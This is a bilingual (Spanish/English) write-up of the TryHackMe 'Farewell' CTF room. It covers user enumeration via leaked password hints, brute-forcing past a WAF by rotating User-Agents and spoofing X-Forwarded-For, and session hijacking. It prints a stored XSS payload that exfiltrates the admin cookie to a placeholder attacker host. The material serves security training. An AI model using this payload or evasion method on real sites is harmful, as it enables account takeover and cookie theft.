# Farewell [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad:** MEDIUM.
* **Tipo:** Premium (requiere suscripción).
* **Slug:** `farewell`
* **Link:** https://tryhackme.com/room/farewell
* **Objeto:** Aplicación web legada (PHP/Apache) protegida por WAF. Explotar fugas de configuración, enumeración de usuarios y XSS almacenado para obtener acceso admin y leer los mensajes de despedida antes de que el servidor se cierre.

---

## Solucionario de Tareas / Task Solutions

> Sala basada en explotación de WAF: bypassear el firewall, hacer brute-force del password de un usuario, y usar Stored XSS para robar la cookie del admin y elevar privilegios.
> WAF-exploitation room: bypass the firewall, brute-force a user password, and use Stored XSS to steal the admin cookie and elevate privileges.

### Reconocimiento / Reconnaissance

- Puertos relevantes: **22 (SSH)** y **80 (HTTP - Apache/2.4.58 + PHP)**.
- Cookie `PHPSESSID` sin flag `HttpOnly`.
- Ticker de la home con usuarios potenciales: `adam`, `deliver11`, `nora`.
- Script `check.js` revela que el servidor filtra `password_hint` (CWE-209) si el username existe.
- `POST /auth.php` devuelve `403 Forbidden` ("WAF is Active") con User-Agents de CLI; se bypassa con un User-Agent de navegador legítimo.
- Directorios revelados: `admin.php`, `index.php`, `info.php`.

Fuente / Source: https://hirtnelson.github.io/Writeups-CTF/farewell.html · https://infosecwriteups.com/farewell-thm-writeup-9fb5a7c50fe3

### Acceso de Usuario / User Access

**Hints de contraseña filtrados por usuario (via `password_hint`): / Password hints leaked per user (via `password_hint`):**

| User | Hint |
|------|------|
| `adam` | mascota favorita + 2 dígitos / favorite pet + 2 digits |
| `deliver11` | Capital de Japón + 4 dígitos / Capital of Japan + 4 digits → **TokyoXXXX** |
| `nora` | número de la suerte 789 / lucky number 789 |
| `admin` | el año + un buen adiós / the year plus a kind send-off |

**Contraseña de `deliver11` (patrón Tokyo + 4 dígitos, obtenida por brute-force con un script Python que rota User-Agents y usa `X-Forwarded-For`/query `?i=` para no disparar el WAF): / Password of `deliver11` (Tokyo + 4-digit pattern, obtained by brute-force with a Python script rotating User-Agents and using `X-Forwarded-For`/`?i=` query to avoid triggering the WAF):**
`TokyoXXXX` (patrón / pattern; el dígito exacto se obtiene en la sala)

Al loguear con `deliver11` se accede a `/dashboard.php` donde se obtiene la primera flag (valor no publicado en texto por las fuentes). / Logging in with `deliver11` reaches `/dashboard.php` where the first flag is obtained (value not published in text by the sources).

Fuente / Source: https://hirtnelson.github.io/Writeups-CTF/farewell.html · https://infosecwriteups.com/farewell-thm-writeup-9fb5a7c50fe3

### Acceso Admin / Admin Access

- En el dashboard hay un formulario de mensajes revisado por un bot administrador.
- El servidor sanitiza etiquetas HTML básicas pero el WAF bloquea palabras clave como `cookie` y `document`.
- Payload de Stored XSS (bypass de WAF mediante concatenación y carga de imagen): / Stored XSS payload (WAF bypass via concatenation and image loading):
```
<body onload="new Image().src='http://<ATTACKER-IP>:4444?x='+document['coo'+'kie']">
```
- El bot admin revisa el mensaje y ejecuta el JS; el atacante captura la cookie `PHPSESSID` del admin en su netcat.
- Con session hijacking se accede a `/admin.php` como `admin` y se obtiene la segunda flag (valor redactado `THM{[REDACTED]}` en las fuentes). / With session hijacking, `/admin.php` is accessed as `admin` and the second flag is obtained (value `THM{[REDACTED]}` in the sources).

Fuente / Source: https://hirtnelson.github.io/Writeups-CTF/farewell.html · https://infosecwriteups.com/farewell-thm-writeup-9fb5a7c50fe3 · https://meetcyber.net/farewell-7e98507f47dc

> **Nota:** Las dos flags `THM{...}` de este room aparecen redactadas en las fuentes públicas en formato texto. Si quieres completar los valores exactos, resuelve la room o proporciona una fuente que los publique.
> **Note:** Both room flags `THM{...}` appear redacted in the public text sources. To fill in exact values, complete the room or provide a source that publishes them.

*Fuente de respuestas / Answer source: https://hirtnelson.github.io/Writeups-CTF/farewell.html · https://infosecwriteups.com/farewell-thm-writeup-9fb5a7c50fe3*

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
